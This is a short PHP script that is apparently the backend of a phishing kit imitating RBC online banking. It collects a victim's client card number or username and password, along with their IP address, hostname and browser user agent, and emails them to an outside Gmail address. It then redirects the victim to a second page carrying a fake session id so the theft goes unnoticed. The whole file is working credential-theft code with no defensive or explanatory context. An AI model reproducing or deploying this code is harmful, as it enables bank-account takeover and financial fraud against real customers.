<?php
if($_POST["formtext1"] != "" and $_POST["formtext2"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------RBC  Info-----------------------\n";
$message .= "Client Card or Username            : ".$_POST['formtext1']."\n";
$message .= "Password            : ".$_POST['formtext2']."\n";
$message .= "Other Online Services            : ".$_POST['formselect2']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- --------------|\n";
$send = "abdoalarg53@gmail.com";
$subject = "R B C | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: page2.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>